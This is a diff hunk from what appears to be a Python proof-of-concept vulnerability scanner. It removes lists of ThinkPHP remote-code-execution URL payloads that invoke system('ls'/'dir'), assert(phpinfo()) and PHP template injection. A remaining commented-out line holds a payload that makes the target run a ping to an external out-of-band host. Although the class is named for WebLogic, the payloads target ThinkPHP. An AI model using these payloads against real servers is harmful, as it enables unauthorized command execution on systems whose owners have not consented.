@@ -85,20 +85,6 @@ class webLogicPOC(POCBase):
         sk.close()
         
         vul_ip = "http://%s:%s" % (_host, _port)
-        payloads=["index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222",
-                  "index.php?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222",
-                  "index.php?s=index/\\think\Request/input&filter=printf&data=ads3234asdg34ggasda222",
-                  "index.php?s=index/\\think\\view\driver\Php/display&content=<?php printf 'ads3234asdg34ggasda222';?>",
-                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222"]
-        
-        payloads2=["index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls",
-                  "index.php?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
-                  "index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir",
-                  "index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>",
-                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
-                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls",
-                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir"]
-
         #url=vul_ip+"/public/index.php?s=captcha"
         #data={"_method":"__construct","filter[]":"system","method":"get","server[REQUEST_METHOD]":"ping%20t00ls.7272e87394b4f7c0088c966cba58c1dd.tu4.org"}
         
